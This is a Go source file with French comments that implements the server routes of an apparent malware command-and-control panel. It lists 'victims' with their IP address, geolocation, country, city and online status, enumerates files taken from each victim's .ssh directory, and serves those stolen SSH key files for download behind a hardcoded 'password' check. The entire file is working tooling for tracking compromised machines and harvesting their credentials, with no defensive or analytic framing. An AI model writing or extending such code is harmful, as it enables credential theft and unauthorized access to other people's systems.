package routes

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

type Victim struct {
	ID        string   `json:"id"`
	Status    string   `json:"status"`
	IP        string   `json:"ip"`
	Latitude  string   `json:"latitude"`
	Longitude string   `json:"longitude"`
	Pays      string   `json:"pays"`
	Ville     string   `json:"ville"`
	SshFiles  []string `json:"sshFiles"`
}

func RouteGetAllVictime(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	// Lecture de l'auth de la requête à partir des paramètres
	auth := r.URL.Query().Get("auth")

	if auth == "" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "Missing parameter 'auth'")
		return
	}

	if auth != "password" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "Not authorized")
		return
	}

	// Récupération des noms de fichiers dans le répertoire "data"
	files, err := ioutil.ReadDir("./data")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprint(w, "Error reading directory")
		return
	}

	// Création du tableau d'objets Victims à partir des noms de fichiers
	victims := []Victim{}
	for _, file := range files {
		victim := Victim{ID: file.Name()}
		// Lecture du contenu du fichier "ip.txt"
		content, err := ioutil.ReadFile(fmt.Sprintf("./data/%s/ip.txt", file.Name()))
		if err == nil {
			// Extraction des informations de l'adresse IP
			lines := strings.Split(string(content), "\n")
			for _, line := range lines {
				fields := strings.Split(line, ":")
				if len(fields) == 2 {
					switch fields[0] {
					case "Ip":
						victim.IP = strings.TrimSpace(fields[1])
					case "Latitude":
						victim.Latitude = strings.TrimSpace(fields[1])
					case "Longitude":
						victim.Longitude = strings.TrimSpace(fields[1])
					case "Pays":
						victim.Pays = strings.TrimSpace(fields[1])
					case "Ville":
						victim.Ville = strings.TrimSpace(fields[1])
					}
				}
			}
		}

		// Lecture du fichier "lastConnect.txt" pour extraire la date de dernière connexion
		lastConnectFile, err := os.Open("data/" + file.Name() + "/lastConnect.txt")
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error reading status file for ID %s", file.Name())
			return
		}
		defer lastConnectFile.Close()

		var lastConnectUnix int64
		fmt.Fscanln(lastConnectFile, &lastConnectUnix)
		victim.Status = fmt.Sprintf("%d", lastConnectUnix)

		// Vérification si la date de dernière connexion est plus grande de 5 minutes que la date actuelle
		if time.Now().Unix()-lastConnectUnix > 30 {
			victim.Status = "off-Line"
		} else {
			victim.Status = "on-Line"
		}

		victims = append(victims, victim)
	}

	// Conversion du tableau d'objets en format JSON et envoi au client
	jsonResponse, err := json.Marshal(victims)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprint(w, "Error converting to JSON")
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonResponse)
}

func RouteGetVictime(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	auth := r.URL.Query().Get("auth")
	id := r.URL.Query().Get("id")

	if auth == "" || id == "" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "Missing parameter 'auth || id'")
		return
	}

	if auth != "password" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "Not authorized")
		return
	}

	// Lecture du fichier correspondant à l'ID de la victime
	content, err := ioutil.ReadFile(fmt.Sprintf("./data/%s/ip.txt", id))
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, "Victim not found")
		return
	}

	// Extraction des informations de l'adresse IP
	victim := Victim{ID: id}
	lines := strings.Split(string(content), "\n")
	for _, line := range lines {
		fields := strings.Split(line, ":")
		if len(fields) == 2 {
			switch fields[0] {
			case "Ip":
				victim.IP = strings.TrimSpace(fields[1])
			case "Latitude":
				victim.Latitude = strings.TrimSpace(fields[1])
			case "Longitude":
				victim.Longitude = strings.TrimSpace(fields[1])
			case "Pays":
				victim.Pays = strings.TrimSpace(fields[1])
			case "Ville":
				victim.Ville = strings.TrimSpace(fields[1])
			}
		}

	}

	// Lecture du fichier "lastConnect.txt" pour extraire la date de dernière connexion
	lastConnectFile, err := os.Open("data/" + id + "/lastConnect.txt")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintf(w, "Error reading status file for ID %s", id)
		return
	}
	defer lastConnectFile.Close()

	var lastConnectUnix int64
	fmt.Fscanln(lastConnectFile, &lastConnectUnix)

	// Vérification si la date de dernière connexion est plus grande de 5 minutes que la date actuelle
	if time.Now().Unix()-lastConnectUnix > 30 {
		victim.Status = "off-Line"
	} else {
		victim.Status = "on-Line"
	}

	// Récupération des noms de fichiers dans le répertoire ".ssh" de la victime
	files, err := ioutil.ReadDir(fmt.Sprintf("./data/%s/.ssh", id))
	if err == nil {
		// Filtrage des fichiers pour renvoyer uniquement ceux qui ne sont pas des dossiers
		sshFiles := []string{}
		for _, file := range files {
			if !file.IsDir() {
				sshFiles = append(sshFiles, file.Name())
			}
		}
		victim.SshFiles = sshFiles
	}

	// Conversion de la victime en format JSON et renvoi au client
	jsonResponse, err := json.Marshal(victim)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprint(w, "Error converting to JSON")
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonResponse)
}

func RouteDownloadFile(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	auth := r.URL.Query().Get("auth")
	id := r.URL.Query().Get("id")
	filename := r.URL.Query().Get("filename")

	if auth == "" || id == "" || filename == "" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "Missing parameter 'auth || id || filename'")
		return
	}

	if auth != "password" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "Not authorized")
		return
	}

	// Lecture du contenu du fichier demandé
	content, err := ioutil.ReadFile(fmt.Sprintf("./data/%s/.ssh/%s", id, filename))
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, "File not found for ID %s", id)
		return
	}

	// Configuration des en-têtes de réponse pour permettre le téléchargement du fichier
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(content)))

	// Envoi du contenu du fichier au client
	w.Write(content)
}
